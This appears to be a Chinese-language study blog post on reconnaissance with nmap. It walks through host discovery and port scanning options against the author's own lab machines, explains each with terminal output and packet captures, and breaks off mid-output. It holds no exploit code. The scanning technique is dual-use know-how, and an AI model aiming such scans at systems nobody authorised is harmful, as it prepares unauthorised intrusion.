<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604001749976.png" alt="image-20220604001749976"></p>
<h2 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h2><p>1.主机开放的端口和服务</p>
<p>2.主机操作系统</p>
<p>常见端口及对应服务</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604095959880.png" alt="image-20220604095959880"></p>
<h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604100037232.png" alt="image-20220604100037232"></p>
<p>命令行运行:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# nmap 192.168.43.44</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 10:01 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Executor (192.168.43.44)</span><br><span class="line">Host is up (0.00058s latency).</span><br><span class="line">Not shown: 996 filtered tcp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">80/tcp  open  http</span><br><span class="line">135/tcp open  msrpc</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 5.04 seconds</span><br></pre></td></tr></table></figure>



<p>GUI运行</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604100256337.png" alt="image-20220604100256337"></p>
<p>基本用法</p>
<p><code>nmap -T4 -A -v 192.168.43.44</code></p>
<blockquote>
<p>-A:进攻性方式扫描</p>
<p>-T4:T后面的数字越大,扫描速度越快,越容易被防火墙发现.默认为-T4选项</p>
<p>-v:详细输出扫描情况,显示扫描细节</p>
</blockquote>
<h5 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h5><h5 id="sL列出将要扫描的IP地址-但是不进行主机发现"><a href="#sL列出将要扫描的IP地址-但是不进行主机发现" class="headerlink" title="-sL列出将要扫描的IP地址,但是不进行主机发现"></a><code>-sL</code>列出将要扫描的IP地址,但是不进行主机发现</h5><p>比如已经写好了一个<code>list.txt</code>作为待扫描的ip地址集合,使用<code>-sL -iL list.txt</code>列出该集合</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# <span class="built_in">cat</span> list.txt</span><br><span class="line">192.168.43.44</span><br><span class="line">192.168.43.1</span><br><span class="line">192.168.43.2</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap -sL -iL list.txt</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 10:08 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Executor (192.168.43.44)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.1</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.2</span><br><span class="line">Nmap <span class="keyword">done</span>: 3 IP addresses (0 hosts up) scanned <span class="keyword">in</span> 1.30 seconds</span><br></pre></td></tr></table></figure>



<h5 id="sn-sP只进行主机发现-不进行端口扫描"><a href="#sn-sP只进行主机发现-不进行端口扫描" class="headerlink" title="-sn/-sP只进行主机发现,不进行端口扫描"></a><code>-sn/-sP</code>只进行主机发现,不进行端口扫描</h5><p><code>192.168.43.1</code>是手机热点的ip地址,</p>
<p><code>192.168.43.44</code>是本机<code>Executor</code>的ip地址</p>
<p><code>192.168.43.2</code>是杜撰的一个ip地址</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap -sn -iL list.txt</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 10:10 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Executor (192.168.43.44)</span><br><span class="line">Host is up (0.00032s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.1</span><br><span class="line">Host is up (0.019s latency).</span><br><span class="line">Nmap <span class="keyword">done</span>: 3 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 2.54 seconds</span><br></pre></td></tr></table></figure>

<p>运行结果显示<code>192.168.43.1</code>和<code>192.168.43.44</code>在线,<code>192.168.43.2</code>不在线</p>
<blockquote>
<p>如果不使用<code>-sn</code>选项,nmap首先进行主机发现,然后进行端口扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap  -iL list.txt</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 10:12 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Executor (192.168.43.44)</span><br><span class="line">Host is up (0.00044s latency).</span><br><span class="line">Not shown: 996 filtered tcp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">80/tcp  open  http</span><br><span class="line">135/tcp open  msrpc</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.1</span><br><span class="line">Host is up (0.014s latency).</span><br><span class="line">Not shown: 999 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">53/tcp open  domain</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 3 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 7.13 seconds</span><br></pre></td></tr></table></figure>


</blockquote>
<h5 id="Pn认为主机都存活-直接端口扫描"><a href="#Pn认为主机都存活-直接端口扫描" class="headerlink" title="-Pn认为主机都存活,直接端口扫描"></a><code>-Pn</code>认为主机都存活,直接端口扫描</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap  -Pn -iL list.txt</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 10:13 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Executor (192.168.43.44)</span><br><span class="line">Host is up (0.00029s latency).</span><br><span class="line">Not shown: 996 filtered tcp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">80/tcp  open  http</span><br><span class="line">135/tcp open  msrpc</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.1</span><br><span class="line">Host is up (0.0063s latency).</span><br><span class="line">Not shown: 999 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">53/tcp open  domain</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.2</span><br><span class="line">Host is up (0.060s latency).		<span class="comment">#这里&quot;host is up&quot;是-Pn选项的作用,让nmap认为它在线,但是没有找到任何打开的端口</span></span><br><span class="line">All 1000 scanned ports on 192.168.43.2 are <span class="keyword">in</span> ignored states.</span><br><span class="line">Not shown: 996 filtered tcp ports (no-response), 4 filtered tcp ports (host-unreach)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 3 IP addresses (3 hosts up) scanned <span class="keyword">in</span> 14.64 seconds</span><br></pre></td></tr></table></figure>



<h5 id="PS-PA-PU-PY使用各种协议方式进行扫描"><a href="#PS-PA-PU-PY使用各种协议方式进行扫描" class="headerlink" title="-PS/PA/PU/PY使用各种协议方式进行扫描"></a><code>-PS/PA/PU/PY</code>使用各种协议方式进行扫描</h5><p>如果不指定这四个之一,则默认使用TCP和ICMP两种方式分别进行主机发现</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap  -sn -iL list.txt</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 10:50 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Executor (192.168.43.44)</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.1</span><br><span class="line">Host is up (0.0054s latency).</span><br><span class="line">Nmap <span class="keyword">done</span>: 3 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 2.55 seconds</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604105103155.png" alt="image-20220604105103155"></p>
<h6 id="PS使用TCP-SYN方式进行主机发现"><a href="#PS使用TCP-SYN方式进行主机发现" class="headerlink" title="-PS使用TCP SYN方式进行主机发现"></a><code>-PS</code>使用TCP SYN方式进行主机发现</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap -PS -sn -iL list.txt</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 10:16 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Executor (192.168.43.44)</span><br><span class="line">Host is up (0.00051s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.1</span><br><span class="line">Host is up (0.0080s latency).</span><br><span class="line">Nmap <span class="keyword">done</span>: 3 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 1.51 seconds</span><br></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604101822988.png" alt="image-20220604101822988"></p>
<blockquote>
<p>运行nmap的wsl kali linux的ip地址是</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.28.30.195  netmask 255.255.240.0  broadcast 172.28.31.255</span><br><span class="line">        inet6 fe80::215:5dff:feeb:45a2  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 00:15:5d:eb:45:a2  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 2564  bytes 187120 (182.7 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 10190  bytes 598185 (584.1 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
</blockquote>
<p>No.1由kali发往192.168.43.2,使用TCP协议的SYN包</p>
<p>No.2由kali发往192.168.43.44,使用TCP协议的SYN包</p>
<p>No.3由kali发往192.168.43.1,使用TCP协议的SYN包</p>
<p>No.4由192.168.43.44发往kali,使用TCP协议SYN,ACK包,kali只要收到该包就知道,129.168.43.44是存活的</p>
<p>No.5由kali发往192.168.43.44,使用TCP协议RST包,kali的主机发现目的已经达到,不再根192.168.43.44胡诌八扯,直接断开连接</p>
<blockquote>
<p>RST标志位</p>
<p>RST表示复位，用来<strong>异常的关闭连接</strong>，在TCP的设计中它是不可或缺的。就像上面说的一样，发送RST包关闭连接时，不必等缓冲区的包都发出去（不像上面的FIN包），直接就丢弃缓存区的包发送RST包。而接收端收到RST包后，也不必发送ACK包来确认。</p>
<p>TCP处理程序会在自己认为的异常时刻发送RST包。例如，A向B发起连接，但B之上并未监听相应的端口，这时B操作系统上的TCP处理程序会发RST包。</p>
<p>又比如，AB正常建立连接了，正在通讯时，A向B发送了FIN包要求关连接，B发送ACK后，网断了，A通过若干原因放弃了这个连接（例如进程重启）。网通了后，B又开始发数据包，A收到后表示压力很大，不知道这野连接哪来的，就发了个RST包强制把连接关了，B收到后会出现connect <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=reset&spm=1001.2101.3001.7020">reset</a> by peer错误。</p>
</blockquote>
<p>No.6由192.168.43.1发往kali,使用TCP协议RST,ACK包.</p>
<blockquote>
<p>[RST,ACK]是什么含义呢?</p>
<p>在No.3kali发往192.168.43.1的SYN数据包中,目的端口是192.168.43.1:80</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604102924144.png" alt="image-20220604102924144"></p>
<p>但是前面我们已经扫描过了,192.168.43.1并未开放该端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 10:27 中国标准时间</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.1</span><br><span class="line"></span><br><span class="line">Host is up (0.011s latency).</span><br><span class="line"></span><br><span class="line">Not shown: 999 closed tcp ports (reset)</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"></span><br><span class="line">53/tcp open  domain</span><br><span class="line"></span><br><span class="line">MAC Address: 92:74:8B:ED:5E:D6 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.43 seconds</span><br></pre></td></tr></table></figure>

<p>于是No.6的意思就是,192.168.43.1对kali说:”你说的话我听见了(收到No.3),但是我听不懂(未开放No.3的目的端口)”</p>
<p>但是kali nmap不管这么多,kali nmap就是想知道192.168.43.1是死是活,即使是一个听不懂话的白痴,也是一个活着的,只要有回复,不管回复的啥都视为或者</p>
</blockquote>
<p>kali始终没有收到192.168.43.2,nmap认为它不存在或者已经死了</p>
<h6 id="PA使用TCP协议ACK包进行主机发现"><a href="#PA使用TCP协议ACK包进行主机发现" class="headerlink" title="-PA使用TCP协议ACK包进行主机发现"></a><code>-PA</code>使用TCP协议ACK包进行主机发现</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap -PA -sn -iL list.txt</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 10:33 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.1</span><br><span class="line">Host is up (0.010s latency).</span><br><span class="line">Nmap <span class="keyword">done</span>: 3 IP addresses (1 host up) scanned <span class="keyword">in</span> 1.50 seconds</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604103434323.png" alt="image-20220604103434323"></p>
<p>No.201~No.203,kali向三个ip地址都发送了一个ACK包,</p>
<p>No.204,kali收到了192.168.43.1的回复,回复使用的是TCP协议RST包,意思是192.168.43.1只回了一个收到,但是不想进一步连接</p>
<p>然后No.205,No.206是kali对另外两个IP地址重复发送了ACK包,确保未收到它俩的信息不是路上的问题.</p>
<p>结果kali仍未收到它俩的回复,因此认为它俩不存在或者已死亡</p>
<blockquote>
<p>但是192.168.43.44是或者的,为啥他不应答呢?</p>
<p>一些操作系统对于不规范的TCP连接请求会直接忽略,比如192.168.43.44上的</p>
<p>一些操作系统对于不规范的TCP连接会敷衍一下但是不建立连接,比如192.168.43.1上的</p>
</blockquote>
<h6 id="PU使用UDP协议进行主机发现"><a href="#PU使用UDP协议进行主机发现" class="headerlink" title="-PU使用UDP协议进行主机发现"></a><code>-PU</code>使用UDP协议进行主机发现</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap -PU -sn -iL list.txt</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 10:39 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Executor (192.168.43.44)</span><br><span class="line">Host is up (0.00039s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.1</span><br><span class="line">Host is up (0.096s latency).</span><br><span class="line">Nmap <span class="keyword">done</span>: 3 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 1.64 seconds</span><br></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604104140787.png" alt="image-20220604104140787"></p>
<p>No.275~No.277,kali向三个ip地址发送了UDP数据报</p>
<p>No.278,No.279,两个目标ip使用ICMP数据报回复,但是192.168.43.2没有回复</p>
<p>NO.280kali向192.168.43.2再次询问”小老弟你怎么回事”,但是仍然没有收到其答复,于是kali nmap认为小老弟死球了</p>
<h6 id="PY使用SCTP协议INIT包进行主机发现"><a href="#PY使用SCTP协议INIT包进行主机发现" class="headerlink" title="-PY使用SCTP协议INIT包进行主机发现"></a><code>-PY</code>使用SCTP协议INIT包进行主机发现</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap -PY -sn -iL list.txt</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 10:44 CST</span><br><span class="line">Nmap <span class="keyword">done</span>: 3 IP addresses (0 hosts up) scanned <span class="keyword">in</span> 2.17 seconds</span><br></pre></td></tr></table></figure>

<p>真的太逊了,谁也没发现</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604104524209.png" alt="image-20220604104524209"></p>
<p>全都是kali发往其他ip的SCTP数据报,但是没有收到任何回复</p>
<h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><h5 id="端口状态"><a href="#端口状态" class="headerlink" title="端口状态"></a>端口状态</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604110513885.png" alt="image-20220604110513885"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap -p 80 -iL list.txt</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 11:04 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Executor (192.168.43.44)</span><br><span class="line">Host is up (0.00031s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.1</span><br><span class="line">Host is up (0.0089s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE  SERVICE</span><br><span class="line">80/tcp closed http</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 3 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 2.69 seconds</span><br></pre></td></tr></table></figure>



<p>本机192.168.43.44上的80端口就是open状态</p>
<p>192.168.43.1上的80端口就是close状态</p>
<h6 id="netstat-n查看本机端口状态"><a href="#netstat-n查看本机端口状态" class="headerlink" title="netstat -n查看本机端口状态"></a><code>netstat -n</code>查看本机端口状态</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>&gt; netstat <span class="literal">-n</span></span><br><span class="line"></span><br><span class="line">活动连接</span><br><span class="line"></span><br><span class="line">  协议  本地地址          外部地址        状态</span><br><span class="line">  TCP    <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">28825</span>        <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">54530</span>        ESTABLISHED</span><br><span class="line">  TCP    <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">28826</span>        <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">28827</span>        ESTABLISHED</span><br><span class="line">  TCP    <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">28827</span>        <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">28826</span>        ESTABLISHED</span><br><span class="line">  TCP    <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">54530</span>        <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">28825</span>        ESTABLISHED</span><br><span class="line">  TCP    <span class="number">192.168</span>.<span class="number">43.44</span>:<span class="number">28944</span>    <span class="number">40.90</span>.<span class="number">189.152</span>:<span class="number">443</span>      ESTABLISHED</span><br><span class="line">  TCP    <span class="number">192.168</span>.<span class="number">43.44</span>:<span class="number">29072</span>    <span class="number">103.212</span>.<span class="number">12.46</span>:<span class="number">3000</span>     ESTABLISHED</span><br><span class="line">  TCP    <span class="number">192.168</span>.<span class="number">43.44</span>:<span class="number">29910</span>    <span class="number">61.150</span>.<span class="number">43.81</span>:<span class="number">443</span>       CLOSE_WAIT</span><br><span class="line">  ....</span><br></pre></td></tr></table></figure>









<h5 id="不指定参数"><a href="#不指定参数" class="headerlink" title="不指定参数"></a>不指定参数</h5><p>默认扫描端口<code>1~1024</code>加上<code>nmap_services</code>中列出的端口</p>
<p><code>nmap_services</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">tcpmux	1/tcp	0.001995	<span class="comment"># TCP Port Service Multiplexer [rfc-1078] | TCP Port Service Multiplexer</span></span><br><span class="line">tcpmux	1/udp	0.001236	<span class="comment"># TCP Port Service Multiplexer</span></span><br><span class="line">compressnet	2/tcp	0.000013	<span class="comment"># Management Utility</span></span><br><span class="line">compressnet	2/udp	0.001845	<span class="comment"># Management Utility</span></span><br><span class="line">compressnet	3/tcp	0.001242	<span class="comment"># Compression Process</span></span><br><span class="line">compressnet	3/udp	0.001532	<span class="comment"># Compression Process</span></span><br><span class="line">unknown	4/tcp	0.000477</span><br><span class="line">rje	5/tcp	0.000000	<span class="comment"># Remote Job Entry</span></span><br><span class="line">rje	5/udp	0.000593	<span class="comment"># Remote Job Entry</span></span><br><span class="line">unknown	6/tcp	0.000502</span><br><span class="line"><span class="built_in">echo</span>	7/sctp	0.000000</span><br><span class="line"><span class="built_in">echo</span>	7/tcp	0.004855</span><br><span class="line"><span class="built_in">echo</span>	7/udp	0.024679</span><br><span class="line">unknown	8/tcp	0.000013</span><br><span class="line">discard	9/sctp	0.000000	<span class="comment"># sink null</span></span><br><span class="line">discard	9/tcp	0.003764	<span class="comment"># sink null</span></span><br><span class="line">discard	9/udp	0.015733	<span class="comment"># sink null</span></span><br><span class="line">unknown	10/tcp	0.000063</span><br><span class="line">systat	11/tcp	0.000075	<span class="comment"># Active Users</span></span><br><span class="line">systat	11/udp	0.000577	<span class="comment"># Active Users</span></span><br><span class="line">unknown	12/tcp	0.000063</span><br><span class="line">daytime	13/tcp	0.003927</span><br><span class="line">daytime	13/udp	0.004827</span><br><span class="line">unknown	14/tcp	0.000038</span><br><span class="line">netstat	15/tcp	0.000038</span><br><span class="line">unknown	16/tcp	0.000050</span><br><span class="line">qotd	17/tcp	0.002346	<span class="comment"># Quote of the Day</span></span><br><span class="line">qotd	17/udp	0.009209	<span class="comment"># Quote of the Day</span></span><br><span class="line">msp	18/tcp	0.000000	<span class="comment"># Message Send Protocol | Message Send Protocol (historic)</span></span><br><span class="line">msp	18/udp	0.000610	<span class="comment"># Message Send Protocol</span></span><br><span class="line">chargen	19/tcp	0.002559	<span class="comment"># ttytst source Character Generator | Character Generator</span></span><br><span class="line">chargen	19/udp	0.015865	<span class="comment"># ttytst source Character Generator</span></span><br><span class="line">ftp-data	20/sctp	0.000000	<span class="comment"># File Transfer [Default Data] | FTP</span></span><br><span class="line">ftp-data	20/tcp	0.001079	<span class="comment"># File Transfer [Default Data]</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap -iL list.txt</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 11:00 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Executor (192.168.43.44)</span><br><span class="line">Host is up (0.00025s latency).</span><br><span class="line">Not shown: 994 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">80/tcp  open  http</span><br><span class="line">135/tcp open  msrpc</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line">902/tcp open  iss-realsecure</span><br><span class="line">912/tcp open  apex-mesh</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.1</span><br><span class="line">Host is up (0.0098s latency).</span><br><span class="line">Not shown: 999 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">53/tcp open  domain</span><br><span 